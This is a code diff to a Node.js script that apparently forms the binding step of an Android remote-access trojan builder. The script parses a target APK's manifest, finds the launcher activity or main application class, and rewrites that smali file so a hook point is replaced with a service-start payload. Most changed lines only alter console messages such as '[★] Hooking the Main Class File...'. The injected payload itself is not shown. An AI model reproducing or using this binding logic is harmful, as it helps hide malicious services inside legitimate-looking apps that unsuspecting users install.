@@ -53,7 +53,9 @@ var copyPermissions = (manifest) => { // $appCtrl.copyPermissions = (manifest) =
 
 };
 
-console.log('Reading the Android Manifest file...\n');
+// $appCtrl.BindOnLaunch = (apkFolder) => {
+
+console.log('[★] Reading the Android Manifest file...\n');
 
 setTimeout(() => {
 
@@ -61,7 +63,7 @@ setTimeout(() => {
 
     if (error) {
 
-      console.log('Reading the Android Manifest file Failed!');
+      console.log('[x] Reading the Android Manifest file Failed!\n');
 
       return;
 
@@ -81,15 +83,15 @@ setTimeout(() => {
 
       if (launcherActivity === -1) {
 
-        console.log('Cannot Find a Suitable Class for Hooking in the Manifest!');
+        console.log('[★] Cannot Find a Suitable Class for Hooking in the Manifest!');
 
-        console.log('Please use Another APK as a Template!.');
+        console.log('[★] Please use Another APK as a Template!.\n');
 
         return;
 
       }
 
-      console.log('Modifying the Android Manifest File...\n');
+      console.log('[★] Modifying the Android Manifest File...\n');
 
       
 
@@ -107,17 +109,15 @@ setTimeout(() => {
 
           if (error) {
 
-            console.log('Modifying the Android Manifest Failed!', error);
+            console.log('[x] Modifying the Android Manifest Failed!\n', error);
 
             return;      		          }
 
           
 
-          console.log('Locating a Suitable Class File for Hooking...\n');
-
-          
-
           setTimeout(() => {
+
+          console.log('[★] Locating the Hookable Main Class File...\n');
 
             readdirp(apkFolder, {fileFilter: launcherActivity, alwaysStat: true})
 
@@ -137,31 +137,29 @@ setTimeout(() => {
 
                   if (!launcherPath) {
 
-                    console.log('Unable to Locate the Hookable Smali Class File!');
+                    console.log('[x] Unable to Locate the Hookable Main Class File!\n');
 
                     return;
 
                   } else {
 
-                    setTimeout(() => {
+                      
 
-                      console.log('Scoped the Main Launcher Activity Class for Hooking: ' + launcherPath + '\n');
-
-                    }, 1000);
+                      console.log('[¡] Hookable Main Class File Located: ' + launcherPath + '\n');
 
                   }
 
-        
-
-                  console.log('Reading the Hookable Smali Class File...\n');
+                  
 
                   setTimeout(() => {
+
+                  console.log('[★] Reading the Hookable Main Class File...\n');
 
                     fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {
 
                       if (error) {
 
-                        console.log('Unable to Read Hookable Class File!');
+                        console.log('[x] Unable to Read the Hookable Class File!\n');
 
                         return;
 
@@ -173,17 +171,19 @@ setTimeout(() => {
 
                       var hook = CONSTANTS.hookPoint;
 
-                      console.log('Hooking the Main Smali Class File...');
-
-                      var output = data.replace(hook, startService);
+                      
 
                       setTimeout(() => {
+
+                      console.log('[★] Hooking the Main Class File...\n');
+
+                      var output = data.replace(hook, startService);
 
                         fs.writeFile(dir.join(apkFolder, launcherPath), output, 'utf8', (error) => {
 
                           if (error) {
 
-                            console.log('Modifying the Smali Class File Failed!', CONSTANTS.logStatus.FAIL);
+                            console.log('[x] Modifying the Hooked Main Class File Failed!\n', CONSTANTS.logStatus.FAIL);
 
                             return;
 
@@ -213,21 +213,17 @@ setTimeout(() => {
 
 }, 1000);
 
+//};
+
 function GetLauncherActivity(manifest) {
 
   const application = manifest['manifest']['application'][0];
 
-  
-
   let mainApplicationClassName = application && application['$'] && application['$']['android:name'];
-
-  
 
   if (mainApplicationClassName && !mainApplicationClassName.startsWith('android.app')) {
 
     mainApplicationClassName = mainApplicationClassName.split('.').pop();
-
-    
 
     if (mainApplicationClassName.startsWith('.')) {
 
@@ -235,19 +231,15 @@ function GetLauncherActivity(manifest) {
 
     }
 
-    
+    setTimeout(() => console.log('[¡] Scoped the Main App Class for Hooking...\n'), 1000);
 
     return mainApplicationClassName + '.smali';
 
   }
 
-  
-
   const activity = application && application['activity'] && application['activity'].find((activity) => {
 
     const intentFilter = activity['intent-filter'];
-
-    
 
     if (intentFilter) {
 
@@ -265,13 +257,9 @@ function GetLauncherActivity(manifest) {
 
     }
 
-    
-
     return false;
 
   });
-
-  
 
   if (activity) {
 
@@ -279,27 +267,21 @@ function GetLauncherActivity(manifest) {
 
     mainActivityClassName = mainActivityClassName.split('.').pop();
 
-    
-
     if (mainActivityClassName.startsWith('.')) {
 
       mainActivityClassName = mainActivityClassName.slice(1);
 
     }
 
-    
+    setTimeout(() => console.log('[¡] Scoped the Main Launcher Activity for Hooking...\n'), 1000);
 
     return mainActivityClassName + '.smali';
 
   }
 
-  
-
   const activityAlias = application && application['activity-alias'] && application['activity-alias'].find((activityAlias) => {
 
     const intentFilter = activityAlias['intent-filter'];
-
-    
 
     if (intentFilter) {
 
@@ -317,13 +299,9 @@ function GetLauncherActivity(manifest) {
 
     }
 
-    
-
     return false;
 
   });
-
-  
 
   if (activityAlias) {
 
@@ -331,23 +309,21 @@ function GetLauncherActivity(manifest) {
 
     targetActivityName = targetActivityName.split('.').pop();
 
-    
-
     if (targetActivityName.startsWith('.')) {
 
       targetActivityName = targetActivityName.slice(1);
 
     }
 
-    
+    setTimeout(() => console.log('[¡] Scoped the Main Launcher Activity in an Alias for Hooking...\n'), 1000);
 
     return targetActivityName + '.smali';
 
   }
 
-  
-
   return -1;
+
+  
 
 }
 ```
